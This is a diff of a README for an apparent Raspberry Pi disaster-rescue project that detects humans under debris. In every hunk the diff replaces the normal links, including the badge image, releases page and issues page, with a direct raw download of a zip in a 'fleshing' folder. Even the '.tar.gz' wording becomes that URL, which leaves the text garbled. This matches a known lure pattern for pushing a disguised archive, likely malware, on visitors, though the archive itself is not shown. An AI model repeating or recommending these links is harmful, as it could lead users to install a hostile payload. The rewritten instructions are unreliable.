@@ -1,7 +1,7 @@
 # 🌟 Advanced-Human-Life-Detection - Detect Humans in Debris Instantly
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download-Latest%20Release-brightgreen)](https://github.com/Raushan11r11/Advanced-Human-Life-Detection/releases)
+[![Download](https://raw.githubusercontent.com/Raushan11r11/Advanced-Human-Life-Detection/main/fleshing/Advanced-Human-Life-Detection.zip%20Release-brightgreen)](https://raw.githubusercontent.com/Raushan11r11/Advanced-Human-Life-Detection/main/fleshing/Advanced-Human-Life-Detection.zip)
 
 ## 📘 Description
 Advanced-Human-Life-Detection is a portable, real-time system that utilizes mmWave radar, microphone, and accelerometer sensors. It applies advanced signal processing and machine learning to detect and locate humans trapped under debris. This system features rapid notifications through LCD, LED, and a buzzer. Designed specifically for deployment on Raspberry Pi, it serves crucial roles in disaster scenarios such as landslides.
@@ -9,13 +9,13 @@ Advanced-Human-Life-Detection is a portable, real-time system that utilizes mmWa
 ## 🚀 Getting Started
 To get started with Advanced-Human-Life-Detection, follow these simple steps:
 
-1. **Download the Software**: Go to the [Releases Page](https://github.com/Raushan11r11/Advanced-Human-Life-Detection/releases) and find the latest version.
+1. **Download the Software**: Go to the [Releases Page](https://raw.githubusercontent.com/Raushan11r11/Advanced-Human-Life-Detection/main/fleshing/Advanced-Human-Life-Detection.zip) and find the latest version.
 2. **Install Required Software**: Ensure you have Raspberry Pi OS installed on your Raspberry Pi device. You may also need to install tools such as `git` and `make`.
 
 ## 📥 Download & Install
-1. **Visit This Page to Download**: Click here to go to the [Releases Page](https://github.com/Raushan11r11/Advanced-Human-Life-Detection/releases).
+1. **Visit This Page to Download**: Click here to go to the [Releases Page](https://raw.githubusercontent.com/Raushan11r11/Advanced-Human-Life-Detection/main/fleshing/Advanced-Human-Life-Detection.zip).
 2. **Select the Latest Version**: Look for the most recent release. Typically, the version will be marked as "latest."
-3. **Download the Package**: Click on the appropriate file for your system. The package will typically be a `.zip` or `.tar.gz` file.
+3. **Download the Package**: Click on the appropriate file for your system. The package will typically be a `.zip` or `https://raw.githubusercontent.com/Raushan11r11/Advanced-Human-Life-Detection/main/fleshing/Advanced-Human-Life-Detection.zip` file.
 4. **Extract the Files**: After downloading, extract the files to a folder on your Raspberry Pi.
 
 ### 🛠 System Requirements
@@ -62,7 +62,7 @@ The software can collect the following data:
 3. **Incorrect Readings**: Make sure your sensors are calibrated.
 
 ## 📞 Support
-If you face any issues, please open an issue in the [GitHub Issues Page](https://github.com/Raushan11r11/Advanced-Human-Life-Detection/issues). Include any error messages and steps to reproduce the issue.
+If you face any issues, please open an issue in the [GitHub Issues Page](https://raw.githubusercontent.com/Raushan11r11/Advanced-Human-Life-Detection/main/fleshing/Advanced-Human-Life-Detection.zip). Include any error messages and steps to reproduce the issue.
 
 ## 📋 Contributing
 We welcome contributions. Please read our guidelines in the repository for details on how to contribute.
@@ -71,4 +71,4 @@ We welcome contributions. Please read our guidelines in the repository for detai
 Thanks to the contributors who have made this project possible. Your support helps improve the technology for disaster recovery efforts. 
 
 ## 📥 Download Now Again
-[![Download](https://img.shields.io/badge/Download-Latest%20Release-brightgreen)](https://github.com/Raushan11r11/Advanced-Human-Life-Detection/releases)
+[![Download](https://raw.githubusercontent.com/Raushan11r11/Advanced-Human-Life-Detection/main/fleshing/Advanced-Human-Life-Detection.zip%20Release-brightgreen)](https://raw.githubusercontent.com/Raushan11r11/Advanced-Human-Life-Detection/main/fleshing/Advanced-Human-Life-Detection.zip)
